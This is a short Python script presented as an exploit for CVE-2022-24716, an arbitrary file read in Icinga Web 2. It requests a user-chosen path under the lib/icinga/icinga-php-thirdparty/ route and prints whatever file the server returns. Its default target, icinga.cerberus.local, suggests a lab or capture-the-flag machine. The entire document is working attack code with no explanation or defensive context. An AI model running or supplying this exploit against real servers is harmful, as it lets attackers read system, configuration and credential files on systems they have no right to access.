import argparse
import requests as requests
import urllib.parse


# CVE-2022–24716 exploit
def read_file(base_url: str, path: str) -> str | None:
    url = urllib.parse.urljoin(base_url, f"./lib/icinga/icinga-php-thirdparty/{path}")
    response = requests.get(url, allow_redirects=False)
    if response.status_code == 200:
        return response.text
    return None


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", type=str, default="http://icinga.cerberus.local:8080/icingaweb2/")
    parser.add_argument("file_path", type=str)
    args = parser.parse_args()

    data = read_file(args.base_url, args.file_path)
    if data:
        print(f"{args.file_path}:\n{data}")
    else:
        print(f"Failed to read {args.file_path}")

